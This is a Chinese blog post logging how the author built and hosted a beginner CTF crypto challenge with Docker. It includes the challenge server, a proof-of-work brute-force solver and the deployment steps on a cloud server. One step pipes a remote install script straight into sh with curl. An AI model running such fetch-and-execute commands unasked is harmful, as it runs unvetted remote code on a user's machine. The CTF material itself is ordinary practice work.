href="https://hub.docker.com/">Docker iD</a>,登陆</p><p>这里实测，发现用了第2步的阿里，就登陆不上了</p><p>索性先不换源了，把代理关了</p><p>(若你执意要换，且登陆失败，可以参考<a href="https://blog.csdn.net/zhuzicc/article/details/117748705">这个</a>)</p></li></ol><h4 id="docker-基本使用"><a href="#docker-基本使用" class="headerlink" title="docker 基本使用"></a>docker 基本使用</h4><h5 id="docker命令"><a href="#docker命令" class="headerlink" title="docker命令"></a>docker命令</h5><ul><li><p><code>docker</code></p><p>进入终端，输入<code>docker</code>回车，可查看docker支持的命令</p></li><li><p><code>docker search nginx</code></p><p>搜索nginx镜像</p></li><li><p><code>docker pull nginx:xxx</code> 获取指定版本的nginx镜像</p><p><code>docker pull nginx</code>         获取最新版本的nginx镜像</p></li><li><p>创建并启动容器（可以使用<a href="http://localhost:8080/访问docker容器）">http://localhost:8080/访问docker容器）</a></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># -d 后台运行</span></span><br><span class="line"><span class="meta"># -p 8080:80 宿主机的8080端口映射到docker内部的80端口</span></span><br><span class="line"><span class="meta"># --name docker-nginx 启动后的容器名称为docker-nginx</span></span><br><span class="line">docker run -d -p <span class="number">8080</span>:<span class="number">80</span> --name docker-nginx nginx</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>查看容器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看运行中的容器</span></span><br><span class="line">docker <span class="built_in">ps</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有容器 包括正在运行和已经停止运行的</span></span><br><span class="line">docker <span class="built_in">ps</span> <span class="literal">-a</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>停止容器</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 通过id直接关闭容器</span></span><br><span class="line"><span class="meta"># docker kill a0fbf4519279</span></span><br><span class="line"><span class="meta"># 通过容器名称直接关闭容器</span></span><br><span class="line">docker kill docker-nginx</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta"># 通过id直接容器 默认等待十秒 超时强制关闭</span></span><br><span class="line"><span class="meta"># docker stop a0fbf4519279</span></span><br><span class="line"><span class="meta"># 通过容器名称关闭容器 默认等待十秒 超时强制关闭  等价于 docker stop -t=10 docker-nginx</span></span><br><span class="line">docker stop docker-nginx</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>启动停止的容器</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 启动容器可通过容器id或者容器名称</span></span><br><span class="line"><span class="meta"># 通过容器名称启动容器，如果已启动则忽略</span></span><br><span class="line">docker start docker-nginx</span><br><span class="line"> </span><br><span class="line"><span class="meta"># 通过容器名称重新启动容器，如果未启动则直接启动，如果已启动则关闭再启动</span></span><br><span class="line"><span class="meta"># docker restart docker-nginx</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="开启一道CTF密码题"><a href="#开启一道CTF密码题" class="headerlink" title="开启一道CTF密码题"></a>开启一道CTF密码题</h2><ul><li><a href="https://4xwi11.github.io/posts/921543e1/#more">https://4xwi11.github.io/posts/921543e1/#more</a></li></ul><p>跟着4XWill师傅走</p><h3 id="文件配置"><a href="#文件配置" class="headerlink" title="文件配置"></a>文件配置</h3><p><strong>以一道极其简单的题目为例</strong></p><p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201224939539.png" alt="file"></p><p>新建文件夹，并将以下文件放入其中</p><p><strong>Dockerfile</strong> (一点都不能有出入！！！)</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.8</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Description=<span class="string">&quot;baby_try&quot;</span> VERSION=<span class="string">&#x27;1.0&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> server.py .</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> secret.py .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x server.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;server.py&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">table = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solve</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line">        <span class="comment"># self.sh = remote(&#x27;121.36.197.254&#x27;, 9999)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># [+] sha256(XXXX+JaakUDSfxkW0xjzV) == 4dbfdc61cb88f5bd08d87493ac62e5ab174780f5f019051f91df8b3c36564ed0</span></span><br><span class="line">        <span class="comment"># [+] Plz tell me X<span class="doctag">XXX:</span></span></span><br><span class="line">        proof = self.sh.recvuntil(<span class="string">b&#x27;[+] Plz tell me XXXX:&#x27;</span>)</span><br><span class="line">        tail = proof[<span class="number">16</span>:<span class="number">32</span>].decode()</span><br><span class="line">        _<span class="built_in">hash</span> = proof[<span class="number">37</span>:<span class="number">101</span>].decode()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">4</span>):</span><br><span class="line">            head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">            t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> t == _<span class="built_in">hash</span>:</span><br><span class="line">                self.sh.sendline(head.encode())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proof_of_work()</span><br><span class="line">        self.sh.recvline()</span><br><span class="line">        flag = self.sh.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        self.sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solution = Solve()</span><br><span class="line">    solution.solve()</span><br></pre></td></tr></table></figure><p><strong>secret.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">b&quot;flag&#123;JUST_THE_FIRST_TEST_OF_CRYPTO&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>server.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">            [random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        _hexdigest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        self.send(<span class="string">f&quot;[+] sha256(XXXX+<span class="subst">&#123;proof[<span class="number">4</span>:]&#125;</span>) == <span class="subst">&#123;_hexdigest&#125;</span>&quot;</span>.encode())</span><br><span class="line">        x = self.recv(prompt=<span class="string">b&#x27;[+] Plz tell me XXXX: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            self.send(<span class="string">b&#x27;[!] Wrong!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        self.send(<span class="string">b&#x27;here is your flag&#x27;</span>)</span><br><span class="line">        self.send(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10001</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(HOST, PORT)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p><strong>cd 到此文件夹</strong></p><h3 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>docker build . -t baby_try</span><br></pre></td></tr></table></figure><h4 id="常见报错处理"><a href="#常见报错处理" class="headerlink" title="常见报错处理"></a>常见报错处理</h4><ul><li><p>找不到，或没有Dockerfile，参考以下链接</p><p><a href="https://blog.csdn.net/pengshengege/article/details/115165400">关于Docker中failed to solve with frontend dockerfile.v0: failed to read dockerfile:报错</a></p><p>原因</p><ul><li>名字大小写打错</li><li>名字加了txt等后缀</li></ul></li><li><p><code>failed to solve with frontend dockerfile.v0: failed to create LLB definition: Invalid containerPort: #</code></p><p>把Dockerfile文件里4XWill师傅给的<strong>注释删了</strong></p></li></ul><h3 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="built_in">run</span> <span class="comment">--name trytry -d -idt -p 12345:10001 baby_try</span></span><br></pre></td></tr></table></figure><p>把容器映射到<strong>本地12345端口</strong>，即：<code>127.0.0.1:12345</code></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="本地连接"><a href="#本地连接" class="headerlink" title="本地连接"></a>本地连接</h4><p><code>nc 127.0.0.1 12345</code></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220602000803936.png" alt="test"></p><p>  ohhhhhhhhhh!  芜湖 🛫️</p><p>这半夜十二点让我猛一精神，身心愉悦！</p><h4 id="exp打入"><a href="#exp打入" class="headerlink" title="exp打入"></a>exp打入</h4><p>在pycharm里把exp.py跑起来（终端我没配置好，故此）</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220602001653717.png" alt="exp"></p><p>打通了，忙活了一个小时十七分钟。</p><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><ul><li><p><code>docker stop [CONTAINER ID]</code> or <code>docker stop [name]</code></p><p>不知道ID 或 名字， 可以用<code>docker ps -a</code>来查看！ </p></li></ul><p>明天再看看怎么买个服务器并架在上面吧！</p><p>开心😄，安然入梦。</p><p><strong>6.2中午两点</strong></p><p>做完核酸了，赶紧跑来实验室捣鼓👀</p><p>开容器就给我犯了难，仔细一看用<code>run</code>的指令，是来<strong>创建</strong>的</p><p>而显然，昨天的那个我们没有删除只是暂停了，而对此我们需要<strong>开启</strong>它</p><h3 id="开启容器"><a href="#开启容器" class="headerlink" title="开启容器"></a>开启容器</h3><p>重新开机记得先把docker打开</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220602141911281.png" alt="docker"></p><p>再于终端输入指令</p><p><code>docker start [CONTAINER ID]</code>  or <code>docker start [name]</code></p><p>其实文章前半部分已经有总结了，还是需要多试试才熟悉🤔</p><h3 id="挂载到服务器"><a href="#挂载到服务器" class="headerlink" title="挂载到服务器"></a>挂载到服务器</h3><ul><li><p><a href="https://www.zhihu.com/question/352006942/answer/867398206">学生服务器推荐</a></p></li><li><p><a href="https://www.aliyun.com/activity/new?spm=5176.13735996.J_8877278870.1.47943c60Hki7eQ">阿里云新人特惠</a></p></li></ul><p>这里我使用已经注册过账号的<a href="https://www.aliyun.com/?spm=5176.13329450.top-nav.dlogo.324b4df5dOtQSs">阿里云</a>（阿里，打钱！👿）</p><p>其旗下的云翼计划，似乎针对学生有优惠</p><p>我用的是它的<strong>试用一个月</strong>🤤🤤🤤（反正目前是白嫖的</p><p>4XWi11师傅参考的链接里大师傅写的教程，是<strong>CentOS</strong></p><p>但前面选服务器配置的时候看到<strong>Ubuntu</strong>时不自觉的点击了🤧</p><p>（实验室有其他师傅比较了解这个，想着是linux就…</p><p>那么，就摸黑前行</p><h4 id="Docker-安装"><a href="#Docker-安装" class="headerlink" title="Docker 安装"></a>Docker 安装</h4><ul><li><a href="https://www.runoob.com/docker/ubuntu-docker-install.html"> 菜鸟教程·Ubuntu Docker 安装</a></li></ul><p>找到服务器的指令端，按照菜鸟教程，键入并执行</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220603231107923.png" alt="指令端"></p><p><code>curl -sSL https://get.daocloud.io/docker | sh</code></p><p>成功后，输入<code>docker</code>验证一下</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220602181546437.png" alt="验证"></p><p>接下来的思路，跟上文已经指出的本地安装一致</p><h4 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h4><ol><li><p><code>apt-get install git -y</code></p><p>安装git</p></li><li><p><code>git clone ....</code></p><p>上传题目到github仓库，让服务器端借此下载文件</p><p>（这一步不固定，总之就是让云服务器上有你本地的题目文件夹里的内容）</p></li><li><p>网页端的终端执行以下代码，就都看到了！</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> CryptoTest</span><br><span class="line">ls</span><br><span class="line">cat exp.py</span><br></pre></td></tr></table></figure><pre><code>（学到了，要把指令同时执行，不然执行完一次cd后，会自动cd回初始目录，白搭👿）![芜湖](https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220602184456699.png)</code></pre></li><li><p>跟着本地的教程再走一遍</p><ul><li><p>建立镜像</p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> CryptoTest</span><br><span class="line">docker build . -t test1</span><br></pre></td></tr></table></figure></li><li><p>开放2022端口</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> CryptoTest</span><br><span class="line">  docker run --name try1 -d -idt -p 2022:10001 test1</span><br></pre></td></tr></table></figure><ul><li><p>本地测试能否连接服务器端端口</p><p> 没反应🤔</p><p> <code>sudo ufw allow 2022</code> 尝试开放2022端口</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> CryptoTest</span><br><span class="line">docker run --name try -d -p 12345:10001 test1</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ol><h5 id="ssh登陆"><a href="#ssh登陆" class="headerlink" title="ssh登陆"></a>ssh登陆</h5><p>除了在阿里云官网的控制台发送指令，mac终端也可连接服务器</p><p><code>ssh root@服务器公网IP</code></p><p>直接登陆好吧！</p><h4 id="失败乃成功之母"><a href="#失败乃成功之母" class="headerlink" title="失败乃成功之母"></a>失败乃成功之母</h4><p>以下为当时的摸索（大多无直接效益）</p><p>但确实让我对linux等熟悉了些</p><h5 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h5><p>企图放弃docker，直接用socat对外暴露端口</p><hr><ul><li><p><a href="https://blog.csdn.net/ATFWUS/article/details/119789735">https://blog.csdn.net/ATFWUS/article/details/119789735</a></p></li><li><p><code>sudo apt-get update</code></p></li><li><p><code>apt-get install yum</code></p></li></ul><p>离谱，脑子糊涂了CentOS需要用到yum 来下载socat，我下了半天没下到yum</p><p>因为Ubuntu是用<code>apt-get install socat</code>里apt-get下的啊🤧</p><p><code>nohup socat -d -d tcp-l:2022,reuseaddr,fork EXEC:&quot;python -u server.py&quot;</code></p><p><code>socat tcp-listen:2022,fork exec:&quot;server&quot;,reuseaddr</code></p><p><strong>??? 失败,本地nc照样连不上</strong></p><hr><h5 id="以为是防火墙有问题🤨"><a href="#以为是防火墙有问题🤨" class="headerlink" title="以为是防火墙有问题🤨"></a>以为是防火墙有问题🤨</h5><ul><li><p><a href="https://blog.csdn.net/aiwangtingyun/article/details/107055158">https://blog.csdn.net/aiwangtingyun/article/details/107055158</a></p></li><li><p><code>apt-get install firewalld</code></p></li><li><p><code>firewall-cmd --add-port=12345/tcp --permanent</code></p><p>开放2022端口</p></li></ul><p>此时 root账户 哪怕我退而求其次，在本地里也不能正常用此docker了</p><p><strong>Error response from daemon: driver failed programming external connectivity on endpoint XXX（端口映射或启动容器时报错）</strong></p><blockquote><p> <strong>原因</strong>：<strong>在我们启动了Docker后，我们再对防火墙firewalld进行操作，就会发生上述报错</strong>，</p></blockquote><ul><li><a href="https://blog.csdn.net/shz_123/article/details/123023614?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165418055716781667832978%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165418055716781667832978&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-123023614-null-null.142^v11^control,157^v13^new_3&utm_term=docker%3A+Error+response+from+daemon%3A+driver+failed+programming+external+connectivity+on+endpoint+&spm=1018.2226.3001.4187">报错类型</a></li></ul><p><code>systemctl restart docker</code>  </p><p> <strong>重启docker服务及可重新生成自定义链DOCKER</strong></p><p>如此，还是没对外开放</p><hr><h4 id="阿里云开放端口"><a href="#阿里云开放端口" class="headerlink" title="阿里云开放端口"></a>阿里云开放端口</h4><ul><li><a href="https://developer.aliyun.com/article/767328">https://developer.aliyun.com/article/767328</a></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220602231141650.png" alt="image-20220602231141650"></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220602231213063.png" alt="image-20220602231213063"></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220602231441172.png" alt="image-20220602231441172"></p><p>手动添加12345端口即可，发现可以本地nc连接上端口了</p><h3 id="Linux-基础指令"><a href="#Linux-基础指令" class="headerlink" title="Linux 基础指令"></a>Linux 基础指令</h3><p><strong>「最短的捷径就是绕远」</strong></p><blockquote><p><a href="https://blog.csdn.net/zengmingen/article/details/50802555">https://blog.csdn.net/zengmingen/article/details/50802555</a></p></blockquote><p>调试、测试过程，意外的学习收获。</p><p>来实验室之前，零散的知道些</p><p>现在有稍微全一点的，还有使用环境，真是太棒了😃</p><h3 id="docker-重启后，又连接不了了"><a href="#docker-重启后，又连接不了了" class="headerlink" title="docker 重启后，又连接不了了"></a>docker 重启后，又连接不了了</h3><h4 id="已知要求"><a href="#已知要求" class="headerlink" title="已知要求"></a><strong>已知要求</strong></h4><ol><li>阿里云开放端口</li><li>······</li></ol><p>发现了，因为重启了，需要再<code>docker start name</code>🤧</p><h4 id="备用选项"><a href="#备用选项" class="headerlink" title="备用选项"></a><strong>备用选项</strong></h4><ul><li><p><code>firewall-cmd --add-port=12345/tcp --permanent</code><br><code>firewall-cmd --zone=public --add-port=12345/tcp --permanent</code></p><p>开放2022端口</p></li><li><p><code>sudo ufw allow 2022</code> </p><p>尝试开放2022端口</p></li></ul><p><strong>改天再开放一个端口，控制变量就知道了哪些是关键步骤了</strong></p><p>总而言之，捣鼓了一天</p><p><code>nc 39.105.3.122 12345</code>，成功（<strong>欢迎解题exp打入</strong>😈）</p><p>下一步该想，如何实现<strong>动态docker端口发放</strong>（目前觉得需要网页端配合，不是单纯服务器+docker的事）</p><p><strong>6月2日23:57</strong></p><hr><h3 id="修改代码等内容后，没反应"><a href="#修改代码等内容后，没反应" class="headerlink" title="修改代码等内容后，没反应"></a>修改代码等内容后，没反应</h3><p><strong>6月3日早九点</strong></p><p>难办，我更换了flag后，nc上去exp打入得到的却还是老flag</p><blockquote><p>🤔重启容器无效，难到要暂时关闭端口再开放？</p></blockquote><p>我悟！</p><p>流程中，是先建立了image（镜像），然后根据镜像建立的容器，无论我怎么重启容器，它的<strong>内容</strong>都是<strong>跟建立镜像时一致</strong>的</p><p>故此，修改内容后，应该再build一个新的镜像，再以此建立新容器</p><ul><li>修改好题目文件的内容(Linux指令复习)<ul><li><code>vim file</code></li><li>输入<code>i</code>或·<code>e</code>，进入编辑模式</li><li>修改完后，按<code>esc</code>退出编辑</li><li>先输入<code>:</code>,后输入<code>wq</code>,<strong>保存修改退出</strong></li></ul></li><li>查看所有镜像 <code>docker images</code></li><li>删除镜像<code>docker rmi [image name]</code></li><li>建立镜像<code>docker build . -t [image name]</code></li><li>创建容器<code>docker run --name [container name] -d -idt -p [port]:10001 [image name]</code></li></ul><p>至此，取得阶段性成果，也编写好markdown文件了</p><p><strong>6.3 23:34</strong></p><p>(密码好难🤯)</p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Mac OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>迎新赛</title>
      <link href="/2022/06/01/%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
      <url>/2022/06/01/%E8%BF%8E%E6%96%B0%E8%B5%9B/</url>
      
